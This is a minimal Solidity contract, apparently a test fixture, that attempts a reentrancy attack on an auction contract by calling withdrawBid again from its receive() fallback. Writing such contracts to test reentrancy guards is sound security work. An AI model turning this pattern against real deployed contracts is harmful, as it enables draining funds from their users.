// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAuction {
    function withdrawBid(uint256 auctionId) external;
}

contract ReentrancyAttacker {
    IAuction public auction;
    uint256 public targetAuctionId;

    constructor(address _auction) {
        auction = IAuction(_auction);
    }

    function attack(uint256 auctionId) external {
        targetAuctionId = auctionId;
        auction.withdrawBid(auctionId);
    }

    receive() external payable {
        auction.withdrawBid(targetAuctionId); // attempt reentrance
    }
}
